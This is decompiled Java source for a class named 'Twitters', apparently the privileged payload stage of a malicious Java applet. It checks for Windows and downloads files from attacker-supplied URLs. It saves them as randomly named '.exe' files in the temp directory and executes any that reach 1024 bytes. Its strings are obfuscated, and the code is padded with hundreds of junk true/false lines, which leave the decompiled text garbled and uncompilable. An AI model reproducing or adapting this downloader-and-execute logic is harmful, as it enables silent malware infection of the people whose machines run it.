// 
// Decompiled by Procyon v0.5.30
// 

package quote;

import java.security.AccessController;
import java.io.InputStream;
import java.io.FileOutputStream;
import java.io.File;
import java.net.URL;
import java.security.PrivilegedExceptionAction;

public class Twitters implements PrivilegedExceptionAction
{
    public static String data;
    public static String cc;
    
    public static byte[] StringToBytes(final String s) {
        true;
        false;
        true;
        true;
        false;
        true;
        true;
        true;
        true;
        false;
        final int n = 2;
        false;
        true;
        true;
        true;
        false;
        true;
        final byte[] array = new byte[s.length() / n];
        false;
        true;
        false;
        true;
        false;
        false;
        true;
        false;
        true;
        true;
        final int n2 = 16;
        false;
        true;
        false;
        false;
        false;
        false;
        true;
        false;
        false;
        false;
        false;
        for (int i = 0; i < s.length(); i += n) {
            true;
            false;
            false;
            true;
            true;
            false;
            false;
            array[i / n] = (byte)((Character.digit(s.charAt(i), n2) << 4) + Character.digit(s.charAt(i + 1), n2));
            false;
            false;
            true;
            false;
            false;
            false;
            true;
            true;
            false;
            false;
            false;
        }
        false;
        true;
        false;
        false;
        true;
        true;
        false;
        false;
        false;
        false;
        false;
        true;
        true;
        false;
        true;
        false;
        false;
        return array;
    }
    
    @Override
    public Object run() throws Exception {
        false;
        false;
        false;
        false;
        false;
        false;
        true;
        true;
        false;
        false;
        true;
        if (Twitters.data == null) {
            return null;
        }
        true;
        false;
        false;
        false;
        false;
        true;
        false;
        try {
            true;
            false;
            false;
            false;
            true;
            false;
            false;
            true;
            true;
            final String property = System.getProperty("o44s.name".replace("4", ""));
            false;
            false;
            false;
            true;
            true;
            true;
            true;
            false;
            true;
            true;
            true;
            true;
            false;
            false;
            true;
            if (property.indexOf("8W888in88888d88ow88s".replace("8", "")) == -1) {
                false;
                true;
                false;
                true;
                true;
                false;
                false;
                return null;
            }
            false;
            true;
            true;
            false;
            false;
            false;
            true;
            true;
            true;
            false;
            false;
            false;
            false;
            false;
            false;
            true;
            true;
            int int1 = 1;
            false;
            false;
            false;
            true;
            true;
            false;
            false;
            false;
            true;
            false;
            true;
            true;
            false;
            true;
            if (Twitters.cc != null) {
                true;
                true;
                false;
                false;
                true;
                false;
                true;
                false;
                false;
                false;
                int1 = Integer.parseInt(Twitters.cc);
                false;
                false;
                true;
                true;
                false;
                false;
                true;
            }
            false;
            true;
            true;
            true;
            true;
            true;
            false;
            true;
            false;
            false;
            true;
            false;
            false;
            true;
            true;
            false;
            true;
            false;
            true;
            for (int i = 0; i < int1; ++i) {
                false;
                false;
                true;
                true;
                false;
                true;
                false;
                true;
                true;
                final String string = Twitters.data + Integer.toString(i);
                false;
                false;
                false;
                false;
                true;
                false;
                true;
                false;
                final URL url = new URL(string);
                true;
                true;
                true;
                true;
                true;
                true;
                true;
                true;
                true;
                false;
                url.openConnection();
                false;
                false;
                false;
                true;
                true;
                true;
                false;
                true;
                false;
                false;
                true;
                false;
                false;
                true;
                true;
                true;
                false;
                false;
                true;
                false;
                false;
                false;
                true;
                false;
                true;
                false;
                false;
                false;
                true;
                final InputStream openStream = url.openStream();
                false;
                true;
                true;
                false;
                true;
                false;
                true;
                true;
                true;
                true;
                false;
                false;
                false;
                false;
                true;
                false;
                true;
                final String property2 = System.getProperty("java.RRioRRR.RtmRRRRRRRpdiRRRrR".replace("R", ""));
                true;
                false;
                false;
                false;
                true;
                true;
                false;
                false;
                false;
                true;
                true;
                false;
                false;
                false;
                true;
                false;
                final String string2 = property2 + File.separator;
                false;
                true;
                true;
                false;
                true;
                false;
                final String string3 = string2 + Math.random();
                true;
                false;
                true;
                true;
                true;
                false;
                final String string4 = string3 + ".euxuuuue".replace("u", "");
                true;
                true;
                false;
                false;
                false;
                false;
                true;
                true;
                false;
                true;
                false;
                true;
                false;
                true;
                false;
                false;
                false;
                false;
                true;
                true;
                false;
                final FileOutputStream fileOutputStream = new FileOutputStream(string4);
                true;
                true;
                false;
                false;
                true;
                true;
                false;
                false;
                true;
                false;
                false;
                false;
                true;
                true;
                true;
                false;
                false;
                false;
                true;
                false;
                true;
                false;
                true;
                false;
                true;
                true;
                false;
                true;
                false;
                false;
                true;
                true;
                true;
                int n = 0;
                int read;
                while ((read = openStream.read()) != -1) {
                    true;
                    false;
                    false;
                    true;
                    true;
                    true;
                    true;
                    false;
                    true;
                    fileOutputStream.write(read);
                    true;
                    false;
                    false;
                    false;
                    true;
                    ++n;
                }
                false;
                true;
                true;
                true;
                true;
                true;
                false;
                false;
                false;
                false;
                false;
                true;
                false;
                false;
                openStream.close();
                false;
                false;
                false;
                true;
                true;
                true;
                fileOutputStream.close();
                false;
                false;
                false;
                false;
                true;
                false;
                false;
                false;
                false;
                true;
                false;
                this.Caller(n, string4);
                true;
                true;
                false;
                true;
                true;
                true;
            }
            false;
            false;
            true;
            true;
            false;
            false;
            false;
            false;
            false;
            false;
            true;
            true;
            false;
        }
        catch (Exception ex) {
            false;
            false;
            true;
            true;
            false;
            true;
            false;
            true;
            true;
            true;
            false;
            false;
            false;
            false;
            false;
            false;
        }
        true;
        false;
        true;
        false;
        true;
        true;
        false;
        false;
        true;
        true;
        false;
        false;
        true;
        false;
        false;
        false;
        true;
        false;
        true;
        true;
        true;
        false;
        true;
        true;
        false;
        false;
        true;
        return null;
    }
    
    private void Caller(final int n, final String s) throws Exception {
        final Runtime runtime = Runtime.getRuntime();
        Boolean b = false;
        if (n >= 1024) {
            b = true;
        }
        if (b) {
            this.ef(runtime, s);
        }
    }
    
    private Process ef(final Runtime runtime, final String s) throws Exception {
        true;
        false;
        true;
        false;
        true;
        true;
        false;
        false;
        true;
        false;
        false;
        true;
        false;
        return runtime.exec(s, null, null);
    }
    
    public Twitters() {
        false;
        true;
        false;
        true;
        false;
        false;
        true;
        true;
        false;
        try {
            true;
            false;
            true;
            AccessController.doPrivileged((PrivilegedExceptionAction<Object>)this);
            true;
            false;
            true;
        }
        catch (Exception ex) {
            false;
            false;
            true;
            true;
            false;
            false;
            true;
            true;
            false;
            false;
        }
        true;
        true;
        true;
        true;
        true;
    }
    
    static {
        Twitters.data = null;
        Twitters.cc = null;
    }
}